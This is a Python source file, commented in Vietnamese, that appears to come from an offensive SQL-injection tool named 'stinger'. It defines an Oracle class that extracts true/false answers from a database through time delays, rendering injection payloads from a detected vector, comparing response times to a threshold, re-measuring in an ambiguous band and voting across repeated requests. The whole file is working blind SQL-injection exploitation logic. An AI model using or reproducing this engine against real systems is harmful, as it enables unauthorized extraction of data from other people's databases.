#!/usr/bin/env python3
"""
Oracle - tầng suy luận true/false dựa trên thời gian, dùng một Vector đã chốt.

Khác script cũ (draft/): oracle KHÔNG hardcode payload. Nó nhận:
  - một Vector (đã chốt qua bước detect) để render payload từ điều kiện [INFERENCE]
  - một callable measure(payload)->giây (do transport cung cấp) -> test được offline

Trách nhiệm:
  - ask(condition) -> True/False: render vector với inference=condition, đo thời gian,
    so với threshold. Hỗ trợ bỏ phiếu (votes) và đo lại khi mập mờ.
  - giữ threshold đã đo từ bước detect (riêng cho vector đã chốt).
"""

from __future__ import annotations

from typing import Callable, Optional

from stinger.vectors import Vector, DetectResult


class Oracle:
    """Hỏi database câu hỏi true/false qua độ trễ thời gian."""

    def __init__(self,
                 detect: DetectResult,
                 measure: Callable[[str], float],
                 sleeptime: float,
                 votes: int = 1,
                 verbose: bool = False,
                 log: Optional[Callable[[str], None]] = None):
        self.vector = detect.vector
        self.measure = measure
        self.sleeptime = sleeptime
        self.baseline = detect.baseline
        self.threshold = detect.threshold
        self.votes = votes
        self.verbose = verbose
        self._log = log or (lambda m: None)
        self.n_req = 0

        # vùng xám quanh threshold -> đo lại để tăng tin cậy (re-measure)
        # rộng = 20% của khoảng [baseline, baseline+sleeptime]
        self._gray = 0.2 * sleeptime

    # -- đo một lần --------------------------------------------------------
    def _timed(self, condition: str) -> float:
        payload = self.vector.render(condition, self.sleeptime)
        dt = self.measure(payload)
        self.n_req += 1
        return dt

    # -- hỏi true/false ----------------------------------------------------
    def ask(self, condition: str) -> bool:
        """True nếu <condition> đúng (SQL). Bỏ phiếu đa số khi votes>1.

        Nếu dt rơi vào vùng xám quanh threshold -> đo lại thêm (tăng tin cậy) trước
        khi quyết định, thay vì tin ngay một phép đo nhiễu.
        """
        hits = 0
        n = 0
        for i in range(max(1, self.votes)):
            dt = self._timed(condition)
            n += 1

            # vùng xám: đo lại 1 lần nếu kết quả không rõ ràng
            if abs(dt - self.threshold) < self._gray:
                dt2 = self._timed(condition)
                n += 1
                # lấy trung bình 2 lần để bớt nhiễu
                dt = (dt + dt2) / 2

            hits += 1 if dt >= self.threshold else 0

            # đồng thuận sớm khi votes=3: 2 phiếu giống nhau trong 2 đầu -> dừng
            if self.votes >= 3 and i == 1 and hits in (0, 2):
                break

        res = hits * 2 > n
        if self.verbose:
            self._log("      %-60s -> %s" % (condition[:60], res))
        return res
